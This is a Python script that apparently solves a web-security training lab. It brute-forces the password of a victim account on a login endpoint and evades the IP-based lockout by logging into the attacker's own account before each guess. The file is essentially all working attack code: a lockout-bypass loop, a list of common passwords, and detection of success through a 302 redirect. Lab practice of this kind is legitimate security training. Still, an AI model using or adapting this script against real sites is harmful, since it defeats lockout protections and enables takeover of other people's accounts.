import requests

# Target configuration
# Replace the URL below with your actual Lab URL
URL = "https://0a08005704e610a080de4ed4005f0060.web-security-academy.net/login"

# Credentials for the account you control to reset the IP lock
MY_USER = "wiener"
MY_PASS = "peter"

# Target user to brute-force
VICTIM_USER = "carlos"

# List of candidate passwords provided by the lab
# Note: In a real scenario, you would load these from a file
PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", 
    "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", 
    "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", 
    "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", 
    "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", 
    "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", 
    "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", 
    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", 
    "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", 
    "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", 
    "love", "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", 
    "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", 
    "mom", "monitor", "monitoring", "montana", "moon", "moscow"
]

def run_exploit():
    # Use a session to maintain cookies if necessary
    session = requests.Session()
    
    print(f"[*] Starting brute-force attack on user: {VICTIM_USER}")
    
    for i, pwd in enumerate(PASSWORDS):
        # Step 1: Log in with valid credentials to reset the IP failure counter
        # This acts as the 'wiener' request in your Pitchfork attack
        reset_payload = {"username": MY_USER, "password": MY_PASS}
        session.post(URL, data=reset_payload)
        
        # Step 2: Attempt to brute-force the victim's password
        # This acts as the 'carlos' request
        attack_payload = {"username": VICTIM_USER, "password": pwd}
        
        # We set allow_redirects=False to catch the 302 Found status
        response = session.post(URL, data=attack_payload, allow_redirects=False)
        
        # Check if the login was successful (302 redirect means success)
        if response.status_code == 302:
            print("-" * 30)
            print(f"[+] SUCCESS! Password found for {VICTIM_USER}: {pwd}")
            print("-" * 30)
            return
        
        # Optional: Print progress every 10 attempts
        if i % 10 == 0 and i > 0:
            print(f"[*] Attempt {i}: Still searching...")

    print("[-] Attack finished. Password not found.")

if __name__ == "__main__":
    run_exploit()
